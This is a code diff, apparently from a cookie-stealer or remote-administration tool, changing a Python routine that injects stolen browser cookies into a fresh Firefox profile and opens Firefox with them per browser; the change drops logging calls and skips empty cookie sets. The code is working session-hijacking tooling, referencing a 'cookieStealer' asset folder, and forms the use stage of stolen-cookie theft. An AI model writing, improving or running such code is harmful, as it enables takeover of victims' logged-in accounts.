@@ -98,7 +98,7 @@ import threading
 cookies = ast.literal_eval(mprint)
 log('Initializing...')
 
-def start_session(browser, cookies, client_id, assets, log):
+def start_session(browser, cookies, client_id, assets):
 
     html_payload = r'''
 <!DOCTYPE html>
@@ -133,7 +133,6 @@ def start_session(browser, cookies, client_id, assets, log):
     import shutil
     import sqlite3
     import sys
-    log('Initializing Profile for {}'.format(browser))
 
     all_domains = []
 
@@ -143,7 +142,6 @@ def start_session(browser, cookies, client_id, assets, log):
     if not os.path.exists(path_to_profile):
         os.makedirs(path_to_profile)
     shutil.copy2(default_cookies_path, path_to_cookies)
-    log('Injecting {} Cookies'.format(browser))
     with sqlite3.connect(path_to_cookies) as connection:
         cursor = connection.cursor()
         for cookie in cookies:
@@ -154,7 +152,6 @@ def start_session(browser, cookies, client_id, assets, log):
                 connection.commit()
             except:
                 pass
-    log('Starting Firefox With {} Cookies'.format(browser))
     profile = FirefoxProfile(path_to_profile)
     driver_chrome = webdriver.Firefox(profile)
     ready_html = os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'cookieStealer', '{}-ready.html'.format(browser)).replace('\\', '/')
@@ -171,7 +168,8 @@ def start_session(browser, cookies, client_id, assets, log):
     driver_chrome.get('file://'+ready_html)
 threads = {}
 for browser in cookies.keys():
-    threads[browser] = threading.Thread(target=start_session, args=(browser, cookies[browser], client_id, assets, log))
-    threads[browser].start()
-log('Please Wait')
+    if len(cookies[browser]) > 0:
+        threads[browser] = threading.Thread(target=start_session, args=(browser, cookies[browser], client_id, assets))
+        threads[browser].start()
+log('Please wait. Firefox started automatically with injected cookies')
 """
